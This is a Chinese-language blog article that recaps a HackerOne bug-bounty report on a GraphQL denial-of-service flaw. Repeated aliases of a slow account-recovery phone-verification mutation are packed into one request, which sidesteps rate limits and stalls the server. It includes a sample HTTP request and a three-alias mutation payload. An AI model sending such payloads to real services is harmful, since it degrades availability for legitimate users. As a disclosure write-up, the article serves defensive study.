#  GraphQL 接口 Mutation别名导致的Hackerone DoS 漏洞  
原创 Pwn1
                        Pwn1  漏洞集萃   2026-04-27 06:11  
  
   
  
> **免责声明**  
  
本公众号所发布的文章内容仅供学习与交流使用，禁止用于任何非法用途。  
  
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
1.    
  
1.    
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
   
  
 在测试一个私有漏洞赏金计划时，我遇到了一个   
  
  
  
## 总结  
  
这是一个存在于 GraphQL API 中的DoS漏洞。  
  
核心问题在于系统没有对单次请求里的 Mutation 别名（数量做严格的安全限制）。  
  
只要在请求里疯狂叠加同一个高耗时操作的别名，服务器就会老老实实地排队挨个处理。这会导致服务器后端资源（如 CPU 或线程池）被严重挤占，正常服务响应变得极度缓慢甚至直接报错超时。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jow1el0IZibxqYHl5ia3TnuEwX0uUiaBRXV5FjNkQRyrURSCKEj5hqBeADxwEndu9STSVsCicNNzTThiarcicU35Uwu6Lcub6IdHF5kDMMEg6wN0U/640?wx_fmt=png&from=appmsg "")  
  
## 漏洞场景  
  
这个漏洞发生在账号安全设置的业务场景里。具体来说，是在设置或验证用于账号恢复的手机号时触发的。对应的核心端点是 /graphql  
，调用的底层接口是用来验证手机验证码的 verifyAccountRecoveryPhoneNumber  
。  
## 原本功能流程  
  
给不太熟悉这块业务的大佬科普一下，按道理来讲，正常不带恶意攻击时，这个功能是这么一步步运作的：  
  
用户在前端的安全设置页面输入需要绑定的恢复手机号，系统发送一条短信验证码。接着，用户把收到的验证码填进输入框并点击提交，前端随之会往后端的 /graphql  
 端点发送一个包含 verifyAccountRecoveryPhoneNumber  
 这一 Mutation 的 POST 请求，同时把 verification_code  
 和 otp_code  
 作为参数传过去。  
  
服务器端收到数据后，会去数据库或者缓存服务里核对验证码的正确性，最后返回验证成功或失败的结果。由于这单次验证可能涉及复杂的校验逻辑或者与外部通信，所以它本身就是一个比较耗时的操作，单次正常请求的响应时间大概在 8 秒左右。  
## 发现过程  
  
最开始盯上这个点，是因为在拦截正常的手机号验证请求包并重放时，敏锐地注意到单次调用的响应时间特别长（将近 8 秒钟）。在这种高耗时接口面前，自然会想到：如果让服务器同时处理多个一模一样的请求会怎么样？是不是能把服务器卡死？  
  
但是，如果在网络层直接使用多线程并发发包，很可能会被系统前端或网关层的速率限制机制给拦截下来。为了绕过常规的并发限制，测试思路转向了 GraphQL 自身的天然特性——别名功能。  
  
既然单次操作耗时 8 秒，那就在同一个 JSON Payload 里面，利用别名把 verifyAccountRecoveryPhoneNumber  
 这个耗时的 Mutation 复制多份，比如命名为 verify1  
、verify2  
、verify3  
。构造好请求发过去之后，效果立竿见影。响应时间开始随着别名的数量线性飙升。  
  
增加一个别名，耗时直接翻倍变成 16 秒；继续叠加，塞入 4 个别名同时发过去，服务器直接就扛不住了，耗时拉长到了 25 到 29 秒，并且由于处理时间过长，网关直接返回了 500 Internal Server Error  
 或者是超时报错。这足以证明服务端正在毫无防备地、依次执行这些极其耗费资源的操作。  
```
POST /graphql HTTP/2
Host: 
Cookie: █████████
Content-Type: application/json
X-Csrf-Token: █████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Content-Length: 417

{"query":"mutation VerifyAccountRecoveryPhoneNumberMutations(verificationcode:String!,otp_code: String) {\n    verify1: verifyAccountRecoveryPhoneNumber(input: { verification_code: verificationcode,otpcode:otp_code }) {\n        __typename\n        me {\n            name\n        }\n    }\n}","variables":{"product_area":"other","product_feature":"other","otp_code":"███████","verification_code":"██████"}}

```  
```
mutation VerifyAccountRecoveryPhoneNumberMutations(verificationcode:String!,otp_code: String) {
    verify1: verifyAccountRecoveryPhoneNumber(input: { verification_code: verificationcode,otpcode:otp_code }) {
        __typename
        me {
            
        }
    }
    verify2: verifyAccountRecoveryPhoneNumber(input: { verification_code: verificationcode,otpcode:otp_code }) {
        __typename
    }
    verify3: verifyAccountRecoveryPhoneNumber(input: { verification_code: verificationcode,otpcode:otp_code }) {
        __typename
    }
}
}

```  
  
  
  
  
来源:  
  
https://hackerone.com/reports/3287208  
  
  
  
  
觉得本文内容对您有启发或帮助？  
  
点个**关注➕**  
，获取更多深度分析与前沿资讯！  
  
  
👉 往期精选  
  
[一种利用 HTTP 重定向循环的新型 SSRF 技术](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484872&idx=1&sn=085b9ed569eefc9a96122fd164da9707&scene=21#wechat_redirect)  
  
  
[预接管账号：结合 OTP 校验分离与空格绕过注册内部管理员邮箱](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247485067&idx=1&sn=766b936ad8c4d5913df74761d4f9e791&scene=21#wechat_redirect)  
  
  
  
  
